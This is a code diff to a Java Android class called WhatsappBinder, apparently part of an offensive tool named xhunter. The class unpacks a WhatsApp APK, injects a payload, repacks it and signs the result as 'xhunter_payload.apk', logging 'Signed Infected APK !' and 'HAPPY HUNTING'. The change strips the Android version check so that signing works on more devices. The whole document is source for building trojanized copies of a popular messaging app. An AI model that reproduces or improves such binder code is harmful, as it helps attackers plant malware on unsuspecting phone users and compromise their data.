@@ -49,10 +49,10 @@ public class WhatsappBinder extends AsyncTask<String, String, Boolean> {
     @Override
     protected Boolean doInBackground(String... strings) {
         init();
-        if (loadResources()) {
-            if (unzip()) {
-                if (edit_app(strings[0])) {
-                    if (zip()) {
+        if (loadResources())
+            if (unzip())
+                if (edit_app(strings[0]))
+                    if (zip())
                         if (sign()) {
                             deleteFolder(working_dir + "normal_apk");
                             deleteFolder(working_dir + "payload");
@@ -61,10 +61,6 @@ public class WhatsappBinder extends AsyncTask<String, String, Boolean> {
                             log.done("!!!! HAPPY HUNTING !!!!");
                             return true;
                         }
-                    }
-                }
-            }
-        }
         return true;
     }
 
@@ -162,14 +158,9 @@ public class WhatsappBinder extends AsyncTask<String, String, Boolean> {
     private boolean sign() {
         log.i("[*] Trying to Sign APK Using APKsigner");
         try {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                ApkSignerTool.main(new String[]{"sign", "--key", res_dir+"test.pk8", "--cert", res_dir+"test.pem", "--out", working_dir+"xhunter_payload.apk", working_dir+"unsigned.apk"});
-                log.s("[+] Signed Infected APK !");
-                return true;
-            }else {
-                log.e("[!] Failed to Sign, Device not compatible try on other device.");
-                return false;
-            }
+            ApkSignerTool.main(new String[]{"sign", "--key", res_dir+"test.pk8", "--cert", res_dir+"test.pem", "--out", working_dir+"xhunter_payload.apk", working_dir+"unsigned.apk"});
+            log.s("[+] Signed Infected APK !");
+            return true;
         } catch (Exception e) {
             log.e("[!] Failed to Sign Infected APK");
             log.ex("Error: "+e.toString());
